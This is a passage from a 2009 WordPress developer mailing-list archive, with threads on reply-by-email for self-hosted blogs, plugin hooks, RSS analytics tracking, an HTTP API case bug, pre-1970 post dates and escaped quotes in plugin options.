	<427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com> 
	<4A5C2802.5060403@mullenweg.com>
	<81B782A6-229E-447D-92ED-73D859F5D643@tekartist.org> 
	<96E1365D-913B-46E3-9BA4-ED62B915FAB2@josephscott.org>
	<427667db0907141637k1cb61bc2sea83d66559f17aa1@mail.gmail.com> 
	<2EDC46FE-EF4B-46FF-9C00-A29607C88F81@josephscott.org>
Message-ID: <427667db0907150939h32d6729dj74734172f941fab1@mail.gmail.com>

2009/7/16 Joseph Scott <joseph at josephscott.org>

>
> On Jul 14, 2009, at 5:37 PM, Lynne Pope wrote:
>
>> Using wordpress.com as a hub would have more mass appeal, but could
>> perhaps
>> raise issues for sites behind firewalls that are prevented from calling
>> out.
>>
>>
>> If wordpress.com was used, would this impact on the ability of site
>> owners
>> to trace emails back to source? Laws in some countries make the need to
>> log
>> and trace very important.
>>
>
>
>
> That's a good question.  What I'd imagine is that the emails would go back
> to WordPress.com and then WordPress.com would communicate with your
> WordPress.org powered blog and add the new post or comment.  In that regard
> it would follow the same pattern as adding a new comment or post via email
> to a WordPress.com blog.
>
> I don't know how that impact the various laws for email logging in other
> countries.


If full email headers were sent with the data this shouldn't impact at all.
I just don't know how the header details could get stored on the receiving
site or even if its feasible for wordpress.com to forward that data. If the
emailed content is coming through a site's own mail servers, tracing is easy
enough.

Anyway, its just a consideration I thought I should mention as it may have a
bearing on which approach gets used.

Cheers,
Lynne

From jcanals at alkivia.com  Wed Jul 15 16:41:49 2009
From: jcanals at alkivia.com (Jordi Canals)
Date: Wed, 15 Jul 2009 18:41:49 +0200
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A5DFD83.7000902@xavisys.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<130AC951-2B9A-4A73-BF07-04C2F72772B5@striderweb.com>
	<4A5DFD83.7000902@xavisys.com>
Message-ID: <394db23a0907150941r283982cbx75a0fbd08cea55be@mail.gmail.com>

Hi,

The activaion hook fires on auto-update. I had to change some plugins
because of that.
Just it does not run on a manual update (when manually replacing the
files by FTP).

Regards,

-- 
Jordi Canals [Txanny]
http://alkivia.org


2009/7/15 Aaron D. Campbell <aaron at xavisys.com>:
> Are you sure about that? ?It looks like the deactivation hook is silently
> skipped, but it looks like the activation hook runs normally on an auto
> upgrade.
>
> Stephen Rider wrote:
>>
>> That won't work for auto-updates (a plugin going from "works with PHP 4+"
>> to "works with PHP 5+").
>>
>> The activation hook does not fire during auto update.
>>

From listswphackers at mist.org.uk  Wed Jul 15 16:51:17 2009
From: listswphackers at mist.org.uk (mrmist)
Date: Wed, 15 Jul 2009 17:51:17 +0100
Subject: [wp-hackers] can url auto-completing in wordpress by turned
	off	somehow?
In-Reply-To: <9aa12a490907150349n6deb4927mcd80fb4a06807b0e@mail.gmail.com>
References: <9aa12a490907150349n6deb4927mcd80fb4a06807b0e@mail.gmail.com>
Message-ID: <KTWYm+AFkgXKFwqV@dsl-217-155-35-239.zen.co.uk>

In message 
<9aa12a490907150349n6deb4927mcd80fb4a06807b0e at mail.gmail.com>, Davit 
Barbakadze <jayarjo at gmail.com> writes
>Today I noticed a strange behavior, which I have not noticed before. If
>permalinks are activated and you enter just one letter after last slash
>(like: domain.com/a) wordpress doesn't through 404 page

No, it doesn't and the auto-complete is a bit too liberal at times, IMO. 
It chooses to redirect at random based on some target urls. That's why I 
raised a bug for it.  http://core.trac.wordpress.org/ticket/8948

-- 
mrmist

From mikeschinkel at newclarity.net  Wed Jul 15 17:39:41 2009
From: mikeschinkel at newclarity.net (mikeschinkel at newclarity.net)
Date: Wed, 15 Jul 2009 12:39:41 -0500 (CDT)
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <427667db0907150939h32d6729dj74734172f941fab1@mail.gmail.com>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>
	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com>
	<427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com>
	<4A5C2802.5060403@mullenweg.com>
	<81B782A6-229E-447D-92ED-73D859F5D643@tekartist.org>
	<96E1365D-913B-46E3-9BA4-ED62B915FAB2@josephscott.org>
	<427667db0907141637k1cb61bc2sea83d66559f17aa1@mail.gmail.com>
	<2EDC46FE-EF4B-46FF-9C00-A29607C88F81@josephscott.org>
	<427667db0907150939h32d6729dj74734172f941fab1@mail.gmail.com>
Message-ID: <291FC603-54E7-4BF8-AB59-AE797AFCC791@newclarity.net>

How about building interfaces so that any server could be set up to be  
the mail receiver and then admins could specify the server that will  
handle the comments? That would let anyone set up a service to do this  
and not just wordpress.com.

Sent from my iPhone

On Jul 15, 2009, at 12:40 PM, Lynne Pope <lynne.pope at gmail.com> wrote:

> 2009/7/16 Joseph Scott <joseph at josephscott.org>
>
>>
>> On Jul 14, 2009, at 5:37 PM, Lynne Pope wrote:
>>
>>> Using wordpress.com as a hub would have more mass appeal, but could
>>> perhaps
>>> raise issues for sites behind firewalls that are prevented from  
>>> calling
>>> out.
>>>
>>>
>>> If wordpress.com was used, would this impact on the ability of site
>>> owners
>>> to trace emails back to source? Laws in some countries make the  
>>> need to
>>> log
>>> and trace very important.
>>>
>>
>>
>>
>> That's a good question.  What I'd imagine is that the emails would  
>> go back
>> to WordPress.com and then WordPress.com would communicate with your
>> WordPress.org powered blog and add the new post or comment.  In  
>> that regard
>> it would follow the same pattern as adding a new comment or post  
>> via email
>> to a WordPress.com blog.
>>
>> I don't know how that impact the various laws for email logging in  
>> other
>> countries.
>
>
> If full email headers were sent with the data this shouldn't impact  
> at all.
> I just don't know how the header details could get stored on the  
> receiving
> site or even if its feasible for wordpress.com to forward that data.  
> If the
> emailed content is coming through a site's own mail servers, tracing  
> is easy
> enough.
>
> Anyway, its just a consideration I thought I should mention as it  
> may have a
> bearing on which approach gets used.
>
> Cheers,
> Lynne
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From jer at simianuprising.com  Wed Jul 15 18:54:00 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 15 Jul 2009 14:54:00 -0400
Subject: [wp-hackers] Inserting Google Analytics into RSS with a plugin
Message-ID: <e1202cb10907151154u33ff07d3tc3bf62c68da0cb0c@mail.gmail.com>

I'm trying to find a way to track people who read our site only using
RSS (we offer full content so we don't expect most readers to click
through unless they want to comment). We use Google Analytics for the
actual blog and like it, and we have way too many feeds we need to
track to use feedburner for each of them.

I was thinking that it would be easy enough to insert the GA tracking
code into the footer of each post in the RSS feed (with a few extra
variables to segment the resulting data). Obviously some readers would
fail to use the javascript and others might strip it, but in many
cases it *should* work as expected, especially for people reading RSS
inside their browsers (which is a lot of people as I understand it).
So it wouldn't get every visitor, but it would at least increase our
readership numbers and stop us from guessing blindly about them.

It seems like an obvious idea but I can't find anything on Google. Has
anyone tried this with WordPress? Is there something important I'm
missing? I'm going to set up a test to see what happens with a smaller
blog, i'll reply here if the results are interesting.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From m at mullenweg.com  Wed Jul 15 18:57:41 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed, 15 Jul 2009 11:57:41 -0700
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <291FC603-54E7-4BF8-AB59-AE797AFCC791@newclarity.net>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com>	<427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com>	<4A5C2802.5060403@mullenweg.com>	<81B782A6-229E-447D-92ED-73D859F5D643@tekartist.org>	<96E1365D-913B-46E3-9BA4-ED62B915FAB2@josephscott.org>	<427667db0907141637k1cb61bc2sea83d66559f17aa1@mail.gmail.com>	<2EDC46FE-EF4B-46FF-9C00-A29607C88F81@josephscott.org>	<427667db0907150939h32d6729dj74734172f941fab1@mail.gmail.com>
	<291FC603-54E7-4BF8-AB59-AE797AFCC791@newclarity.net>
Message-ID: <4A5E26A5.5070201@mullenweg.com>

On 7/15/2009 10:39 AM, mikeschinkel at newclarity.net wrote:
> How about building interfaces so that any server could be set up to be
> the mail receiver and then admins could specify the server that will
> handle the comments? That would let anyone set up a service to do this
> and not just wordpress.com.

This is vaguely to similar to what's in core WP already, it has the 
ability to check an email account and post that to a blog. Maybe that 
functionality could be moved out of core into a canonical plugin and 
merged with the new email processing stuff we developed on the wp.com side.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From radial at mindspring.com  Wed Jul 15 19:00:52 2009
From: radial at mindspring.com (Phil Hart)
Date: Wed, 15 Jul 2009 15:00:52 -0400
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
Message-ID: <1D820372548745EB93B5C91BE2D1F129@philhpc>


From bogus@does.not.exist.com  Wed Jul 15 02:15:36 2009
From: bogus@does.not.exist.com ()
Date: Wed, 15 Jul 2009 02:15:36 -0000
Subject: No subject
Message-ID: <mailman.0.1247684455.16652.wp-hackers@lists.automattic.com>

does this

http://intensedebate.com/


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Chris Poteet
Sent: Monday, July 13, 2009 10:35 AM
To: wp-hackers at lists.automattic.com
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs

Is there a plan to implement this in the self hosted version?

http://en.blog.wordpress.com/2009/04/23/comment-reply-via-email-open-to-all/
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From gaarai at gaarai.com  Wed Jul 15 19:01:45 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Wed, 15 Jul 2009 14:01:45 -0500
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <4A5E26A5.5070201@mullenweg.com>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>	<b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com>	<427667db0907132101pedf891eve1c6c02b354cdfba@mail.gmail.com>	<4A5C2802.5060403@mullenweg.com>	<81B782A6-229E-447D-92ED-73D859F5D643@tekartist.org>	<96E1365D-913B-46E3-9BA4-ED62B915FAB2@josephscott.org>	<427667db0907141637k1cb61bc2sea83d66559f17aa1@mail.gmail.com>	<2EDC46FE-EF4B-46FF-9C00-A29607C88F81@josephscott.org>	<427667db0907150939h32d6729dj74734172f941fab1@mail.gmail.com>	<291FC603-54E7-4BF8-AB59-AE797AFCC791@newclarity.net>
	<4A5E26A5.5070201@mullenweg.com>
Message-ID: <4A5E2799.8000602@gaarai.com>

I've had a shelved blog by email plugin project around for many months
now. It works, but it needs some polish on the interface. Basically, you
can send full HTML emails complete with images, and it will do media
uploads of all the images, and handle the HTML appropriately to make a
new post.

I've been watching this topic for a while and it has me thinking. What
if I also added some code that could parse a message as a reply to a
comment?

Would anyone be interested?

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/
http://dnsyogi.com/



Matt Mullenweg wrote:
> On 7/15/2009 10:39 AM, mikeschinkel at newclarity.net wrote:
>> How about building interfaces so that any server could be set up to be
>> the mail receiver and then admins could specify the server that will
>> handle the comments? That would let anyone set up a service to do this
>> and not just wordpress.com.
>
> This is vaguely to similar to what's in core WP already, it has the
> ability to check an email account and post that to a blog. Maybe that
> functionality could be moved out of core into a canonical plugin and
> merged with the new email processing stuff we developed on the wp.com
> side.
>

From johnbillion+wp at gmail.com  Wed Jul 15 19:01:53 2009
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Wed, 15 Jul 2009 20:01:53 +0100
Subject: [wp-hackers] HTTP Request API edge case
Message-ID: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>

Just a quick heads up for anyone who may be using the POST method with
the wp_remote_request() function in WordPress, you must ensure that
POST is written in uppercase as the cURL transport method will fail
otherwise (at the switch statement in WP_Http_Curl::request). Other
transport methods may suffer from this too, I haven't checked.

Bit of an edge case I know but I thought I would put it out there.

Regards,
John.

From simon at sweetinteraction.com  Wed Jul 15 19:05:31 2009
From: simon at sweetinteraction.com (Simon Wheatley)
Date: Wed, 15 Jul 2009 20:05:31 +0100
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>
Message-ID: <77c8b7bf0907151205m2c8f55od007fa13e9543adb@mail.gmail.com>

On Wed, Jul 15, 2009 at 8:01 PM, John
Blackbourn<johnbillion+wp at gmail.com> wrote:
> Just a quick heads up for anyone who may be using the POST method with
> the wp_remote_request() function in WordPress, you must ensure that
> POST is written in uppercase as the cURL transport method will fail
> otherwise (at the switch statement in WP_Http_Curl::request). Other
> transport methods may suffer from this too, I haven't checked.
>

John is tactfully not mentioning that it's my plugin (unreleased) he
discovered this on. cURL was set to default transport method in WP 2.8
(?) instead of the streams transport method (previously default).
Streams handles a lowercase "post" and cURL doesn't... which is how I
hit that particular bug. Thanks to John for figuring it out.

S


---
Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
Registered office: 7 Malton Av, Manchester, M21 8AT

From m at mullenweg.com  Wed Jul 15 19:09:27 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed, 15 Jul 2009 12:09:27 -0700
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>
Message-ID: <4A5E2967.50503@mullenweg.com>

On 7/15/2009 12:01 PM, John Blackbourn wrote:
> Just a quick heads up for anyone who may be using the POST method with
> the wp_remote_request() function in WordPress, you must ensure that
> POST is written in uppercase as the cURL transport method will fail
> otherwise (at the switch statement in WP_Http_Curl::request). Other
> transport methods may suffer from this too, I haven't checked.
>
> Bit of an edge case I know but I thought I would put it out there.

Worth a patch on Trac to strtoupper to protect anyone in the future.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From beau at dentedreality.com.au  Wed Jul 15 19:13:27 2009
From: beau at dentedreality.com.au (Beau Lebens)
Date: Wed, 15 Jul 2009 12:13:27 -0700
Subject: [wp-hackers] Inserting Google Analytics into RSS with a plugin
In-Reply-To: <e1202cb10907151154u33ff07d3tc3bf62c68da0cb0c@mail.gmail.com>
References: <e1202cb10907151154u33ff07d3tc3bf62c68da0cb0c@mail.gmail.com>
Message-ID: <902424490907151213r3af6f2dbvf6bdb81f93b89a09@mail.gmail.com>

> I was thinking that it would be easy enough to insert the GA tracking
> code into the footer of each post in the RSS feed (with a few extra
> variables to segment the resulting data). Obviously some readers would
> fail to use the javascript and others might strip it, but in many
> cases it *should* work as expected, especially for people reading RSS
> inside their browsers (which is a lot of people as I understand it).
> So it wouldn't get every visitor, but it would at least increase our
> readership numbers and stop us from guessing blindly about them.

Any remotely security-conscious feed reader (even if it's
browser-based) will strip remote JavaScript from being loaded inline.

You might be able to emulate something with an image/tracking-pixel
based solution tho?

From jer at simianuprising.com  Wed Jul 15 19:30:57 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 15 Jul 2009 15:30:57 -0400
Subject: [wp-hackers] Inserting Google Analytics into RSS with a plugin
In-Reply-To: <902424490907151213r3af6f2dbvf6bdb81f93b89a09@mail.gmail.com>
References: <e1202cb10907151154u33ff07d3tc3bf62c68da0cb0c@mail.gmail.com>
	<902424490907151213r3af6f2dbvf6bdb81f93b89a09@mail.gmail.com>
Message-ID: <e1202cb10907151230h64a83267p97bc5f8ad2e496e9@mail.gmail.com>

That's a fair point. Anyone tried it with automattic stats?

On Wed, Jul 15, 2009 at 3:13 PM, Beau Lebens<beau at dentedreality.com.au> wrote:
>> I was thinking that it would be easy enough to insert the GA tracking
>> code into the footer of each post in the RSS feed (with a few extra
>> variables to segment the resulting data). Obviously some readers would
>> fail to use the javascript and others might strip it, but in many
>> cases it *should* work as expected, especially for people reading RSS
>> inside their browsers (which is a lot of people as I understand it).
>> So it wouldn't get every visitor, but it would at least increase our
>> readership numbers and stop us from guessing blindly about them.
>
> Any remotely security-conscious feed reader (even if it's
> browser-based) will strip remote JavaScript from being loaded inline.
>
> You might be able to emulate something with an image/tracking-pixel
> based solution tho?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From sbruner at slipfire.com  Wed Jul 15 19:46:39 2009
From: sbruner at slipfire.com (Steve Bruner [SlipFire])
Date: Wed, 15 Jul 2009 15:46:39 -0400
Subject: [wp-hackers] Inserting Google Analytics into RSS with a plugin
Message-ID: <45c7e0790907151246i4af8edefocf0d6c2e552d61a9@mail.gmail.com>

I've used this plugin and it worked well.  Added a RSS campaign to my GA.

http://wordpress.org/extend/plugins/rss-link-tagger-for-google-analytics/

From wp at xentek.net  Wed Jul 15 20:06:45 2009
From: wp at xentek.net (Eric Marden)
Date: Wed, 15 Jul 2009 16:06:45 -0400
Subject: [wp-hackers] Inserting Google Analytics into RSS with a plugin
In-Reply-To: <e1202cb10907151154u33ff07d3tc3bf62c68da0cb0c@mail.gmail.com>
References: <e1202cb10907151154u33ff07d3tc3bf62c68da0cb0c@mail.gmail.com>
Message-ID: <441A5F3E-071B-4594-B319-D1C13841B1D7@xentek.net>

On Jul 15, 2009, at 2:54 PM, Jeremy Clarke wrote:

> I'm trying to find a way to track people who read our site only using
> RSS (we offer full content so we don't expect most readers to click
> through unless they want to comment).

You could use FeedBurner.com for this, which is now owned by Google. A  
ton of plugins are out there to integrate FB into your WP blog.

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/






From scribu at gmail.com  Wed Jul 15 20:08:35 2009
From: scribu at gmail.com (scribu)
Date: Wed, 15 Jul 2009 23:08:35 +0300
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <4A5E2799.8000602@gaarai.com>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
	<4A5C2802.5060403@mullenweg.com>
	<81B782A6-229E-447D-92ED-73D859F5D643@tekartist.org>
	<96E1365D-913B-46E3-9BA4-ED62B915FAB2@josephscott.org>
	<427667db0907141637k1cb61bc2sea83d66559f17aa1@mail.gmail.com>
	<2EDC46FE-EF4B-46FF-9C00-A29607C88F81@josephscott.org>
	<427667db0907150939h32d6729dj74734172f941fab1@mail.gmail.com>
	<291FC603-54E7-4BF8-AB59-AE797AFCC791@newclarity.net>
	<4A5E26A5.5070201@mullenweg.com> <4A5E2799.8000602@gaarai.com>
Message-ID: <349fe48b0907151308q1816b206n2cb64bef4ff29f38@mail.gmail.com>

On Wed, Jul 15, 2009 at 10:01 PM, Chris Jean <gaarai at gaarai.com> wrote:

> I've been watching this topic for a while and it has me thinking. What
> if I also added some code that could parse a message as a reply to a
> comment?
>
> Would anyone be interested?
>

Of course we would be interested - that's what the topic is about. Be sure
to leave a note here when / if you release it.


-- 
http://scribu.net

From gaarai at gaarai.com  Wed Jul 15 20:10:25 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Wed, 15 Jul 2009 15:10:25 -0500
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <349fe48b0907151308q1816b206n2cb64bef4ff29f38@mail.gmail.com>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>	<4A5C2802.5060403@mullenweg.com>	<81B782A6-229E-447D-92ED-73D859F5D643@tekartist.org>	<96E1365D-913B-46E3-9BA4-ED62B915FAB2@josephscott.org>	<427667db0907141637k1cb61bc2sea83d66559f17aa1@mail.gmail.com>	<2EDC46FE-EF4B-46FF-9C00-A29607C88F81@josephscott.org>	<427667db0907150939h32d6729dj74734172f941fab1@mail.gmail.com>	<291FC603-54E7-4BF8-AB59-AE797AFCC791@newclarity.net>	<4A5E26A5.5070201@mullenweg.com>
	<4A5E2799.8000602@gaarai.com>
	<349fe48b0907151308q1816b206n2cb64bef4ff29f38@mail.gmail.com>
Message-ID: <4A5E37B1.6030003@gaarai.com>

Will do. It will probably need a lot of 1) polish, 2) security review to
ensure that it can be locked down yet easily usable, and 3) thorough
testing.

I'll see about getting it an interface and have it running by the end of
the week.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/
http://dnsyogi.com/



scribu wrote:
> On Wed, Jul 15, 2009 at 10:01 PM, Chris Jean <gaarai at gaarai.com> wrote:
>
>   
>> I've been watching this topic for a while and it has me thinking. What
>> if I also added some code that could parse a message as a reply to a
>> comment?
>>
>> Would anyone be interested?
>>
>>     
>
> Of course we would be interested - that's what the topic is about. Be sure
> to leave a note here when / if you release it.
>
>
>   

From john.ivar.myrstad at gmail.com  Wed Jul 15 21:23:21 2009
From: john.ivar.myrstad at gmail.com (John Myrstad)
Date: Wed, 15 Jul 2009 23:23:21 +0200
Subject: [wp-hackers] Post dates older than 1.1.1970 - PHP issue
Message-ID: <d29aad6e0907151423ub864e5esc3653db0dfca4327@mail.gmail.com>

When using the Simili timeline in WordPress its not possible to have posts
older than 1.1.1970. As I understand this is a PHP issue, but are there any
workarounds or hacks that may remove the limit ? As I understand its done
with MovableType or TextPattern.

http://www.simile-widgets.org/timeline/
http://wordpress.org/extend/plugins/wp-simile-timeline/

John Myrstad

From lynne.pope at gmail.com  Thu Jul 16 01:02:55 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Thu, 16 Jul 2009 13:02:55 +1200
Subject: [wp-hackers] Post dates older than 1.1.1970 - PHP issue
In-Reply-To: <d29aad6e0907151423ub864e5esc3653db0dfca4327@mail.gmail.com>
References: <d29aad6e0907151423ub864e5esc3653db0dfca4327@mail.gmail.com>
Message-ID: <427667db0907151802hcb2fe32g7d020faacf9399b8@mail.gmail.com>

2009/7/16 John Myrstad <john.ivar.myrstad at gmail.com>

> When using the Simili timeline in WordPress its not possible to have posts
> older than 1.1.1970. As I understand this is a PHP issue, but are there any
> workarounds or hacks that may remove the limit ? As I understand its done
> with MovableType or TextPattern.


It's not simply a PHP issue as MySQL, server apps, and operating systems are
also designed to use the UNIX timestamp. The epoch date is 1st January 1970
and all times are calculated as seconds elapsed since the epoch.

One way to get around this in a script is to calculate the required date as
the number of seconds before the epoch and enter this as a negative value.
Here's a calculator that can give you the number:
http://www.unixtimestamp.com/index.php

I've never had any luck with using negative time in WordPress so if you do,
please share!

Lynne

From dino at duechiacchiere.it  Thu Jul 16 01:34:29 2009
From: dino at duechiacchiere.it (Dino Termini)
Date: Wed, 15 Jul 2009 21:34:29 -0400
Subject: [wp-hackers] Post dates older than 1.1.1970 - PHP issue
In-Reply-To: <427667db0907151802hcb2fe32g7d020faacf9399b8@mail.gmail.com>
References: <d29aad6e0907151423ub864e5esc3653db0dfca4327@mail.gmail.com>
	<427667db0907151802hcb2fe32g7d020faacf9399b8@mail.gmail.com>
Message-ID: <4A5E83A5.5000407@duechiacchiere.it>

Does this mean that Wordpress will stop working in 2070? I mean, I won't 
be probably alive by that time, but just for curiosity... or even worse, 
in 2038 [1]?
camu

[1] http://en.wikipedia.org/wiki/Year_2038_problem

Lynne Pope ha scritto:
> 2009/7/16 John Myrstad <john.ivar.myrstad at gmail.com>
>
>   
>> When using the Simili timeline in WordPress its not possible to have posts
>> older than 1.1.1970. As I understand this is a PHP issue, but are there any
>> workarounds or hacks that may remove the limit ? As I understand its done
>> with MovableType or TextPattern.
>>     
>
>
> It's not simply a PHP issue as MySQL, server apps, and operating systems are
> also designed to use the UNIX timestamp. The epoch date is 1st January 1970
> and all times are calculated as seconds elapsed since the epoch.
>
> One way to get around this in a script is to calculate the required date as
> the number of seconds before the epoch and enter this as a negative value.
> Here's a calculator that can give you the number:
> http://www.unixtimestamp.com/index.php
>
> I've never had any luck with using negative time in WordPress so if you do,
> please share!
>
> Lynne
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

-- 
due chiacchiere <http://feeds.feedburner.com/duechiacchiere>

From lynne.pope at gmail.com  Thu Jul 16 02:04:52 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Thu, 16 Jul 2009 14:04:52 +1200
Subject: [wp-hackers] Post dates older than 1.1.1970 - PHP issue
In-Reply-To: <4A5E83A5.5000407@duechiacchiere.it>
References: <d29aad6e0907151423ub864e5esc3653db0dfca4327@mail.gmail.com> 
	<427667db0907151802hcb2fe32g7d020faacf9399b8@mail.gmail.com> 
	<4A5E83A5.5000407@duechiacchiere.it>
Message-ID: <427667db0907151904p4544e56cy1826316c0d95e1a5@mail.gmail.com>

By then, we won't need WordPress as our blog posts will be getting beamed
straight from our thoughts through a subliminal wave pattern LOL.

29 years is more than a lifetime in technology.

2009/7/16 Dino Termini <dino at duechiacchiere.it>

> Does this mean that Wordpress will stop working in 2070? I mean, I won't be
> probably alive by that time, but just for curiosity... or even worse, in
> 2038 [1]?
> camu
>
> [1] http://en.wikipedia.org/wiki/Year_2038_problem
>
> Lynne Pope ha scritto:
>
>> 2009/7/16 John Myrstad <john.ivar.myrstad at gmail.com>
>>
>>
>>
>>> When using the Simili timeline in WordPress its not possible to have
>>> posts
>>> older than 1.1.1970. As I understand this is a PHP issue, but are there
>>> any
>>> workarounds or hacks that may remove the limit ? As I understand its done
>>> with MovableType or TextPattern.
>>>
>>>
>>
>>
>> It's not simply a PHP issue as MySQL, server apps, and operating systems
>> are
>> also designed to use the UNIX timestamp. The epoch date is 1st January
>> 1970
>> and all times are calculated as seconds elapsed since the epoch.
>>
>> One way to get around this in a script is to calculate the required date
>> as
>> the number of seconds before the epoch and enter this as a negative value.
>> Here's a calculator that can give you the number:
>> http://www.unixtimestamp.com/index.php
>>
>> I've never had any luck with using negative time in WordPress so if you
>> do,
>> please share!
>>
>> Lynne
>>
>

From speedboxer at gmail.com  Thu Jul 16 02:42:52 2009
From: speedboxer at gmail.com (Matt Freedman)
Date: Wed, 15 Jul 2009 19:42:52 -0700
Subject: [wp-hackers] single quote in plugin options
In-Reply-To: <6dbcd2670907150540h331fec17tbf685605896bad9b@mail.gmail.com>
References: <5BB88894-BE93-42FC-9525-AFA2F0D87388@daivmowbray.com> 
	<b88434820907150126lbbabe82uaa99335ca874f9a0@mail.gmail.com> 
	<BB1819DD-1A08-47BD-843B-57B9FEB3228B@daivmowbray.com>
	<6dbcd2670907150540h331fec17tbf685605896bad9b@mail.gmail.com>
Message-ID: <b88434820907151942l4d331079u6a8874ae13f966ca@mail.gmail.com>

Actually, the quotes are (purposely) added using addslashes() in
wp-includes/wp-db.php before inserting the data into the database.

Regards,
Matt Freedman

On Wed, Jul 15, 2009 at 5:40 AM, Will
Anderson<wp-hackers at itsananderson.com> wrote:
> By the way, those slashes are due to Magic Quotes, a feature that will be
> removed in PHP 5.3 and 6. If you want to guard your code against future
> releases, or you want to distribute it to people who might have Magic Quotes
> disabled (which can be done fairly easily), you'll probably want to check
> whether Magic Quotes are enabled before calling stripslashes. here's a good
> article on Magic Quotes. At the bottom of the page you'll find a code
> snippet that should give you a good idea of how to do this check.
>
> http://www.tizag.com/phpT/php-magic-quotes.php
>
> Best,
> Will Anderson
> http://www.itsananderson.com/
>
> On Wed, Jul 15, 2009 at 5:56 AM, Daiv Mowbray <daiv at daivmowbray.com> wrote:
>
>>
>> Thanx very much Matt,
>> stripslashes() is what I needed.
>> before display and before using in my javascript.
>>
>>
>> On Jul 15, 2009, at 10:26 AM, Matt Freedman wrote:
>>
>> ?Use stripslashes() before displaying the option.
>>>
>>
>>
>> ----------
>> Daiv Mowbray
>> daiv at daivmowbray.com
>> ----------
>>
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> Will Anderson
> http://www.itsananderson.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Matt Freedman
http://mattfreedman.ca/

From speedboxer at gmail.com  Thu Jul 16 02:43:27 2009
From: speedboxer at gmail.com (Matt Freedman)
Date: Wed, 15 Jul 2009 19:43:27 -0700
Subject: [wp-hackers] single quote in plugin options
In-Reply-To: <b88434820907151942l4d331079u6a8874ae13f966ca@mail.gmail.com>
References: <5BB88894-BE93-42FC-9525-AFA2F0D87388@daivmowbray.com> 
	<b88434820907150126lbbabe82uaa99335ca874f9a0@mail.gmail.com> 
	<BB1819DD-1A08-47BD-843B-57B9FEB3228B@daivmowbray.com>
	<6dbcd2670907150540h331fec17tbf685605896bad9b@mail.gmail.com> 
	<b88434820907151942l4d331079u6a8874ae13f966ca@mail.gmail.com>
Message-ID: <b88434820907151943r3aea796bk47bc662cb67e1c4b@mail.gmail.com>

Rather, those quotes are escaped using addslashes(). Sorry for the error.

